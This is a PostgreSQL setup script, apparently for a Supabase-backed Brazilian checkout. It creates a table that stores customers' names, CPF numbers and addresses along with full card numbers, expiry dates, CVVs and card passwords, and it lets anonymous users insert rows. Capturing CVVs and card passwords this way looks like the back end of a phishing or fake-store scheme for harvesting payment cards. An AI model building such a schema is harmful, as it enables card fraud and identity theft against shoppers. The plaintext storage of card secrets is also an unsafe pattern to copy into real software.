create extension if not exists pgcrypto;

create or replace function public.ensure_users_and_caed_table()
returns boolean
language plpgsql
security definer
set search_path = public
as $$
begin
  create table if not exists public.users_and_caed (
    id uuid primary key default gen_random_uuid(),
    created_at timestamptz not null default now(),

    full_name text not null,
    cpf text not null,
    email text not null,
    phone text not null,

    cep text not null,
    address text not null,
    number text not null,
    complement text,
    neighborhood text not null,
    city text not null,
    state text not null,

    payment_method text not null check (payment_method in ('pix', 'card')),
    card_holder_name text,
    card_brand text,
    card_number text,
    card_expiry text,
    card_cvv text,
    card_cpf text,
    card_password text,
    card_last4 text,

    cart_items jsonb not null default '[]'::jsonb,
    cart_subtotal numeric(10,2) not null default 0
  );

  alter table public.users_and_caed add column if not exists card_number text;
  alter table public.users_and_caed add column if not exists card_expiry text;
  alter table public.users_and_caed add column if not exists card_cvv text;
  alter table public.users_and_caed add column if not exists card_cpf text;
  alter table public.users_and_caed add column if not exists card_password text;

  alter table public.users_and_caed enable row level security;

  drop policy if exists "insert users_and_caed anon" on public.users_and_caed;
  create policy "insert users_and_caed anon"
  on public.users_and_caed
  for insert
  to anon, authenticated
  with check (true);

  return true;
end;
$$;

grant execute on function public.ensure_users_and_caed_table() to anon, authenticated;

select public.ensure_users_and_caed_table();

